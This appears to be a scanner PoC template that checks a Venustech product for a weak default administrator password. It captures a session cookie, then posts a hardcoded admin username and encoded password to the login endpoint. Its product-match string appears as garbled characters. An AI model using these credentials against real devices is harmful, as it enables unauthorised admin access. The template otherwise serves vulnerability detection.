name: yaml-poc-venustech-wlsj-weak_password-CT-456734
binding: 38b7f215-0b98-466e-a513-bf9787c4bbee
detail:
    author: system_user
    links:
        - https://www.venustech.com.cn/new_type/wlsj/
    vulnerability:
        id: ecf97b52-cc6f-4738-b2db-773358f1b226
        level: medium
transport: http
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /ops/Login
            headers:
                Content-Type: application/x-www-form-urlencoded
            follow_redirects: false
        expression: response.status == 200 && response.raw_header.bcontains(b"Set-Cookie") && response.body_string.contains("ÍøÓùÐÇÔÆ")
        output:
            search_cookie: '"Set-Cookie:(?P<cookie>.*?)".bsubmatch(response.raw_header)'
            var_cookie: search_cookie["cookie"]
    r2:
        request:
            cache: true
            method: POST
            path: /ops/index.php?c=Login&a=Verify
            headers:
                Content-Type: application/x-www-form-urlencoded
                Cookie: SERVER_ADDR={{var_host}};SERVER_ADDR_FULL={{var_hostinfo}};{{var_cookie}}
            body: u=sysuseradmin&p=116264704E61706262667E637535202322
            follow_redirects: false
        expression: response.status == 200 && "^{\\s*\"param\"(.*)[i|I]ndex(.*)}$".bmatches(response.body)
expression: r1() && r2()
